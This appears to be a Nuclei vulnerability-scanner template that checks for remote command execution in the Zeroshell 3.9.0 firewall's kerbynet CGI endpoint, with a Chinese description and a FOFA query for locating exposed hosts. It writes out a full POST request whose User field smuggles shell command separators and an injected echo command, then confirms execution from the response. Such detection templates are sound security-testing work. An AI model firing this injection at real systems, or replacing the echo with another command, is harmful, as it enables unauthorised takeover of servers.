id: zeroshell-fw-kerbynet-rce

info:
  name: zeroshell-fw-kerbynet-rce
  author: yy
  severity: high
  description: Zeroshell是一个微型的linux发行版本，它功能强大，具有强大的router、radius、web门户、防火墙、virtual、Qos、DHCP、dns转发等功能，可以用来安装到服务器上为内网提供网络服务。Zeroshell3.9.0防火墙统存在远程命令执行漏洞，攻击者通过漏洞可以获取服务器权限。
  tags: zeroshell,rce
  metadata:
    fofa-qeury: tilte=zeroshell
    veified: true
    max-request: 1

http:
  - raw:
      - |              
        POST /cgi-bin/kerbynet HTTP/1.1
        Content-Type: multipart/form-data; boundary=----------YWJkMTQzNDcw
        Content-Length: 378
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Encoding: gzip,deflate,br
        User-Agent: User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)
        Host: 
        Connection: Keep-alive

        ------------YWJkMTQzNDcw
        Content-Disposition: form-data; name="Action"

        StartSessionSubmit
        ------------YWJkMTQzNDcw
        Content-Disposition: form-data; name="User"

        echo bgcafo$()\ baghqn\nz^xyu||a #' &{{rce}}||a #|" &echo bgcafo$()\ baghqn\nz^xyu||a #
        ------------YWJkMTQzNDcw
        Content-Disposition: form-data; name="PW"


        ------------YWJkMTQzNDcw--

    payloads:
      rce:
        - "echo 12345948~"
             
    matchers:     
      - type: dsl
        name: rce
        dsl:
          - "status_code_1 == 200 && contains(body,'12345948~') && contains(header,'text/html')"
